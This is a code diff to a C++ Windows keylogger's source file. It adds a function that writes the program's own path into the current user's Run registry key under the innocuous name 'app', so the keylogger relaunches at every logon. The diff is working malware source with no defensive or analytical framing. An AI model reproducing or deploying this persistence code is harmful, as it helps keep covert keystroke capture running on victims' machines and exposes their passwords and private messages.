@@ -1,3 +1,5 @@
+//   Author(s) : Narcis GRECU(narcisgrecu07@gmail.com
+
 #include "KeyLogger.h"
 
 #include <fstream>
@@ -7,6 +9,7 @@
 #include <WinUser.h>
 
 #define MSB -32767
+#define BUFLEN 512
 
 KeyLogger::KeyLogger(std::string Path)
 {
@@ -185,4 +188,49 @@ void KeyLogger::WriteMessage(std::string Message)
 	OutFile << Message;
 
 	OutFile.close();
+}
+
+bool KeyLogger::RegisterPersistence()
+{
+	char processPath[BUFLEN];
+
+	if (!GetModuleFileNameA(nullptr, processPath, BUFLEN))
+	{
+		WriteMessage("[!] Failed to get path to the current process!\n");
+
+		return false;
+	}
+
+	HKEY registryKey;
+
+	long result = RegCreateKeyExA(
+		HKEY_CURRENT_USER,
+		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		0,
+		nullptr,
+		0,
+		KEY_WRITE | KEY_READ,
+		nullptr,
+		&registryKey,
+		nullptr
+	);
+
+	if (result)
+	{
+		WriteMessage("[!] Failed to create/open key. \n");
+		
+		return false;
+	}
+
+	int bytesToSet = strlen(processPath);
+
+	result = RegSetValueExA(registryKey, "app", 0, REG_SZ, reinterpret_cast<BYTE*>(processPath), bytesToSet);
+
+	if (registryKey)
+		RegCloseKey(registryKey);
+
+	if (result != ERROR_SUCCESS)
+		return false;
+
+	return true;
 }
